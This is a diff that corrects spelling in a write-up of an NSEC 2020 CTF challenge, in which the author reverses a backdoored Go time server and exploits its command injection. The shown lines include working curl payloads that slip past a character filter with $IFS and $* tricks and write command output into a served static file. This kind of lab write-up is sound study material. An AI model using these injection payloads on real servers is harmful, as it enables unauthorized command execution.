@@ -2,7 +2,7 @@
 
 ## Overview
 
-This is a walk through of "Hack The Time" a 4 point challenge from the 2020 NSEC CTF. It was a great challenge that required static analysis, dynamic analysis, web skills, Go knowledge, and some creative Bash foo to solve. This was team effort with help from two of my teammates (finding the arg and some bash foo).
+This is a walk-through of "Hack The Time" a 4-point challenge from the 2020 NSEC CTF. It was a great challenge that required static analysis, dynamic analysis, web skills, Go knowledge, and some creative Bash foo to solve. This was team effort with help from two of my teammates (finding the arg and some bash foo).
 
 Props to [@becojo](https://twitter.com/becojo) for a great challenge!
 
@@ -112,7 +112,7 @@ Let's look at the `/time.json` handler (`main_timeHandler`)
 
 ![timeHandler](images/timeHandler.png)
 
-It gets the current time (`time_Now`), formats it (`time_Time_Format`), coverts it to a string (`runtime_convTstring`), and finally prints it (`fmt_Fprintf`). Nothing jumps out as being a backdoor, so lets move on for now. We can come back and reverse engineer this function in more depth if we don't find anything else.
+It gets the current time (`time_Now`), formats it (`time_Time_Format`), coverts it to a string (`runtime_convTstring`), and finally prints it (`fmt_Fprintf`). Nothing jumps out as being a backdoor, so let's move on for now. We can come back and reverse engineer this function in more depth if we don't find anything else.
 
 How about `main_root` the handler for `/`?
 
@@ -450,7 +450,7 @@ Thread 1 "time_server" hit Breakpoint 6, main.rr (s=...) at /app/main.go:12
 12      in /app/main.go
 ```
 
-Excellent, we are have successfully reached the backdoor code. What does it actually do? We saw in the static analysis a call to `runtime_concatstring2` with the string `echo ` (with the space) and then a call to `os_exec_Command` with the string `bash` involved. If we let the code run, we should see something echoed to the gdb terminal.
+Excellent, we have successfully reached the backdoor code. What does it actually do? We saw in the static analysis a call to `runtime_concatstring2` with the string `echo ` (with the space) and then a call to `os_exec_Command` with the string `bash` involved. If we let the code run, we should see something echoed to the gdb terminal.
 
 
 ```gdb
@@ -483,7 +483,7 @@ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 POST
 ```
 
-Confirmed. What we have so far is a few checks and then an echo of the HTTP verb from the requst. Somehow we need to use this to get a flag from the server. Let's review the checks first:
+Confirmed. What we have so far is a few checks and then an echo of the HTTP verb from the request. Somehow, we need to use this to get a flag from the server. Let's review the checks first:
 
 1. Is the a form key of `mlaasdkfasldkfm`?
 2. Is there at least one arugement to the server?
@@ -498,13 +498,13 @@ If those 4 checks are passed, then we run `bash -c echo [HTTP verb from request]
 ### *Exploitation*
 -----------------
 
-First, we need to get the argument on the running challenge server. At this point one of my teamates posted in our chat:
+First, we need to get the argument on the running challenge server. At this point one of my teammates posted in our chat:
 
 ```
 chat: http://time-server.ctf:8080/debug/pprof/etc/services doesn't 404
 ```
 
-He was using Ghidra, and when I posted the `mlaasdkfasldkfm` string in chat he search for it.
+He was using Ghidra, and when I posted the `mlaasdkfasldkfm` string in chat he searched for it.
 
 ![ghidra search](images/ghidra_search.png)
 
@@ -546,7 +546,7 @@ $ curl -v http://127.0.0.1:8080/?mlaasdkfasldkfm=testarg -X ':'
 400 Bad Request
 ```
 
-After testing, I had the following list: `={}[]<>():;"\/ ` (a space is the last character in that list). That's pretty restrictive, as most everyhing we would want to do in bash would involve a slash and a space.
+After testing, I had the following list: `={}[]<>():;"\/ ` (a space is the last character in that list). That's pretty restrictive, as most everything we would want to do in bash would involve a slash and a space.
 
 As a CTF participant and security researcher I've escaped my way out of a fair number of character restricted command injections, but this one really upped the difficulty. A common trick to get around space restriction is with input/output redirection (`<` and `>`) but those are restricted as well. `${IFS}` is another favorite, but curly braces are restricted. We better hope the flag is in the current directory as `/` is restricted.
 
@@ -560,7 +560,7 @@ Let's take stock of our current status:
 1. We have no way of seeing the output of the command as it is local to the server
 2. We can pass arbitrary strings to `bash -c echo ` with lots of restrictions
 
-We know we are working with a webserver, and its a safe bet to guess it is serving static files from somewhere. This could be the same directory as the `time_server` binary, or perhaps `/var/www/html`. If you've cloned the repository where this writeup lives you have the answer already, but assume you don't know. We have the binary, let's work through how to figure it out. We notice that running `./time_server` locally fails to return any HTML and panics.
+We know we are working with a webserver, and it's a safe bet to guess it is serving static files from somewhere. This could be the same directory as the `time_server` binary, or perhaps `/var/www/html`. If you've cloned the repository where this writeup lives you have the answer already, but assume you don't know. We have the binary, let's work through how to figure it out. We notice that running `./time_server` locally fails to return any HTML and panics.
 
 ```bash
 $ ./time_server 
@@ -586,7 +586,7 @@ created by net/http.(*Server).Serve
         /usr/local/go/src/net/http/server.go:2928 +0x384
 ```
 
-Let's look at `main.main` where the errors orignate in GDB.
+Let's look at `main.main` where the errors originate in GDB.
 
 ```
 $ gdb ./time_server 
@@ -661,7 +661,7 @@ EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
 [------------------------------------------------------------------------------]
 ```
 
-Hmm nothing obvious yet. Step forward a few instuctions.
+Hmm nothing obvious yet. Step forward a few instructions.
 
 ```
 gdb-peda$ ni # a few of these
@@ -707,12 +707,10 @@ Legend: code, data, rodata, value
 0x000000000076341c      716     // "index.html".
 ```
 
-Look at the string in `RCX`: `static/`. Thats where the static files must be loaded from. We know that script.js and styles.css exist since they are loaded when we browse to `/` on the challenge server, so if we overwrite either of those and browse to them, we should get our command output!
+Look at the string in `RCX`: `static/`. That's where the static files must be loaded from. We know that script.js and styles.css exist since they are loaded when we browse to `/` on the challenge server, so if we overwrite either of those and browse to them, we should get our command output!
 
-At this point, my team and I tried many, many different Bash tricks to get command output locally. A breakthrough came when one teamate suggesting using `$*` to separate `$IFS` from the next string. This allowed us to create spaces. I was excited. We had a clear path to the flag, just need to locate it and `cat` it. I ran the following expantalty:
+At this point, my team and I tried many, many different Bash tricks to get command output locally. A breakthrough came when one teammate suggested using `$*` to separate `$IFS` from the next string. This allowed us to create spaces. I was excited. We had a clear path to the flag, and we just needed to locate and `cat` it. I ran the following expectantly:
 
-```
- 
 ```bash
 $ curl time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a -X '&&cd$IFS$*static&&find$IFS..|tee$IFS$*styles.css' >/dev/null`
 $ curl time-server.ctf:8080/styles.css
@@ -752,7 +750,6 @@ $ curl time-server.ctf:8080/styles.css
 
 Great, now I can save a `/` character to a file and then `cat` that file to use `/` in the command. 
 
-
 ```bash
 $ curl time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a -X '&&cd$IFS$*static&&ls$IFS-dF|tr$IFS-d$IFS$*.|tee$IFS$*slash' >/dev/null
 $ # The command is: echo && cd static && find / | tee style.css
@@ -761,7 +758,7 @@ $ # A suspiciously long time later, the curl returns
 $ wget time-server.ctf:8080/styles.css
 ```
 
-styles.css was 64MB of find output. Undetered, I was so close to the flag the size didn't slow me down. 
+styles.css was 64MB of find output. Undeterred, I was so close to the flag the size didn't slow me down. 
 
 ```bash
 kali@pwn-machine:/mnt/hgfs/nsec/time$ grep -i flag styles.css 
@@ -829,6 +826,6 @@ FLAG-ac0c58453b7208f9ee9d204b54988b98
 
 ![score](images/score.gif)
 
-I am positive there were simpler ways to solve this challege, but no one can take away the feeling of finally getting a challege after struggling for hours. 
+I am positive there were simpler ways to solve this challenge, but no one can take away the feeling of finally getting a challenge after struggling for hours. 
 
 NSEC 2020 was a ton of fun, and we'll be back next year.
